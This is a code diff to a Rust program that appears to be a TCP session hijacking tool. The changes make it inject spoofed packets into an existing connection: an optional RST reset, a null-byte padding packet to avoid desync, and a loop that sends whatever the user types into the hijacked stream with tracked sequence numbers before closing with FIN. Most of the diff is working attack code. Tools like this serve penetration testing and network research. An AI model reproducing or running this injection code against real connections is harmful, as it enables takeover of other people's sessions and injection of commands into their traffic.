@@ -51,29 +51,43 @@ fn run() -> Result<()> {
 
     let (mut tx, _rx) = net::create_socket()?;
 
+    // bump seq
+    seq += offset as u32;
+
     if arguments.reset {
-        println!("TODO TODO TODO");
         net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::RST, seq, 0, &[]);
         println!("[+] Connection has been reset");
         return Ok(());
     }
 
-    // bump seq
-    seq += offset as u32;
+    if arguments.send_null {
+        info!("Sending 1kb of null bytes to prevent desync");
 
-    // get data for one packet
+        let data = vec![0; 1024];
+        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data);
+        seq += data.len() as u32;
+    }
+
+    println!("Starting hijack session, Please use ^D to terminate.");
+    println!("Anything you enter from now on is sent to the hijacked TCP connection.");
+
     let mut stdin = io::stdin();
     let mut data = vec![0; 512];
-    let len = stdin.read(&mut data)?;
+    loop {
+        let len = stdin.read(&mut data)?;
 
-    let data = &data[..len];
+        if len == 0 {
+            break;
+        }
 
-    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data);
+        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data[..len]);
 
-    // bump seq afterwards
-    // seq += data.len() as u32;
+        // bump seq afterwards
+        seq += len as u32;
+    }
 
-    // close: TH_ACK | TH_FIN
+    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::FIN, seq, ack, &[]);
+    println!("Exiting..");
 
     Ok(())
 }
